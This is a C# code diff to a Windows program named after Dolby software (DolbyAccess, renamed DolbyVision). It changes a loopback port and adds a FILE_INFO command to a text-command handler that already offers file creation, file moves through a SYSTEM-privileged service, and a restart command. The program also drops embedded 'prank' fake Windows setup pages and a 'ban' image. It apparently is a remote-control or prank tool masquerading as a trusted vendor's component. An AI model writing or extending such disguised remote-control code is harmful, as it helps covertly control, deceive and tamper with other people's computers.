@@ -15,7 +15,7 @@ using System.Management;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace DolbyAccess
+namespace DolbyVision
 {
     internal static class Program
     {
@@ -43,7 +43,7 @@ namespace DolbyAccess
         private static Thread _pipeThread;
         private static Thread _tcpPrivThread;
         private const string PipeName = "DolbyVisionPriv";
-        private const int PrivTcpPort = 9115; // 普通模式与SYSTEM服务的本地回环通信端口
+        private const int PrivTcpPort = 9114; // 普通模式与SYSTEM服务的本地回环通信端口
         private const string NormalMutexName = "Global\\DolbyVision_Normal_Running";
         private static Mutex _normalMutex;
         // SYSTEM模式动态端口控制
@@ -461,6 +461,10 @@ namespace DolbyAccess
                 {
                     return FileMkdir(cmd.Substring(11));
                 }
+                if (cmd.StartsWith("FILE_INFO:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return FileInfoAttr(cmd.Substring(10));
+                }
                 if (cmd.Equals("RESTART_NORMAL", StringComparison.OrdinalIgnoreCase))
                 {
                     return RestartNormalMode();
@@ -547,7 +551,7 @@ namespace DolbyAccess
             {
                 bool isWin11 = version.Equals("Win11", StringComparison.OrdinalIgnoreCase);
                 string fileName = isWin11 ? "Win11_OOBE.html" : "Win10_OOBE.html";
-                string resourceName = isWin11 ? "DolbyAccess.Assets.Win11_OOBE_Prank.html" : "DolbyAccess.Assets.Win10_OOBE_Prank.html";
+                string resourceName = isWin11 ? "DolbyVision.Assets.Win11_OOBE_Prank.html" : "DolbyVision.Assets.Win10_OOBE_Prank.html";
                 // 从嵌入资源释放HTML到TEMP
                 string htmlPath = Path.Combine(Path.GetTempPath(), fileName);
                 var assembly = System.Reflection.Assembly.GetExecutingAssembly();
@@ -587,7 +591,7 @@ namespace DolbyAccess
             {
                 // 从嵌入资源加载ban.jpg
                 var assembly = System.Reflection.Assembly.GetExecutingAssembly();
-                using (var stream = assembly.GetManifestResourceStream("DolbyAccess.Assets.ban.jpg"))
+                using (var stream = assembly.GetManifestResourceStream("DolbyVision.Assets.ban.jpg"))
                 {
                     if (stream == null) return "ERROR: ban.jpg资源未找到";
                     Image banImage = Image.FromStream(stream);
@@ -880,6 +884,43 @@ namespace DolbyAccess
             catch (Exception ex) { return "ERROR: " + ex.Message; }
         }
 
+        private static string FileInfoAttr(string path)
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                if (Directory.Exists(path))
+                {
+                    var di = new DirectoryInfo(path);
+                    sb.AppendLine("类型|目录");
+                    sb.AppendLine("名称|" + di.Name);
+                    sb.AppendLine("路径|" + di.FullName);
+                    sb.AppendLine("创建时间|" + di.CreationTime.ToString("yyyy-MM-dd HH:mm:ss"));
+                    sb.AppendLine("修改时间|" + di.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"));
+                    sb.AppendLine("属性|" + di.Attributes.ToString());
+                    long totalSize = 0; int fileCount = 0;
+                    try { foreach (var f in di.GetFiles()) { totalSize += f.Length; fileCount++; } } catch { }
+                    sb.AppendLine("文件数|" + fileCount);
+                    sb.AppendLine("大小(顶层)|" + totalSize + "B");
+                }
+                else if (File.Exists(path))
+                {
+                    var fi = new FileInfo(path);
+                    sb.AppendLine("类型|文件");
+                    sb.AppendLine("名称|" + fi.Name);
+                    sb.AppendLine("路径|" + fi.FullName);
+                    sb.AppendLine("大小|" + fi.Length + "B");
+                    sb.AppendLine("创建时间|" + fi.CreationTime.ToString("yyyy-MM-dd HH:mm:ss"));
+                    sb.AppendLine("修改时间|" + fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"));
+                    sb.AppendLine("属性|" + fi.Attributes.ToString());
+                    sb.AppendLine("扩展名|" + fi.Extension);
+                }
+                else { return "ERROR: 文件或目录不存在"; }
+                return sb.ToString().TrimEnd('\r', '\n');
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
         private static void WriteStr(NetworkStream stream, string s)
         {
             byte[] data = Encoding.UTF8.GetBytes(s + "\n");
@@ -905,10 +946,10 @@ namespace DolbyAccess
         {
             try
             {
-                // 通过本地回环9115请求SYSTEM服务模式移动文件
+                // 通过本地回环9114请求SYSTEM服务模式移动文件
                 using (var client = new TcpClient())
                 {
-                    client.Connect("127.0.0.1", 9115);
+                    client.Connect("127.0.0.1", 9114);
                     using (var s = client.GetStream())
                     {
                         string cmd = "MOVE:" + src + "|" + dst;
